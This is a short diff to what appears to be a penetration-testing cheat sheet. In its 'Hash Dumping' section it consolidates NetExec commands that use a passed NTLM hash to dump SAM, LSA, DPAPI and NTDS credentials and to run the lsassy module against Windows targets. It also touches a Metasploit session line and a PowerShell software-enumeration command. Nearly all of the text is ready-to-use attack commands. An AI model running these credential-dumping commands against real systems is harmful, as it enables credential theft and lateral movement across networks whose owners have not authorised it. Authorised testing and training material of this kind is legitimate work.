@@ -487,10 +487,8 @@ sessions
 sessions -i 1
 
 [*] Hash Dumping
-nxc smb $TARGET -u '$USERNAME' -H '$HASH' --sam --local-auth
-nxc smb $TARGET -u '$USERNAME' -H '$HASH' --lsa --local-auth
+nxc smb $TARGET -u '$USERNAME' -H '$HASH' --sam --lsa --dpapi --ntds --local-auth
 nxc smb $TARGET -u '$USERNAME' -H '$HASH' -M lsassy --local-auth
-nxc smb $TARGET -u '$USERNAME' -H '$HASH' --ntds
 
 [*] Enumeration
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
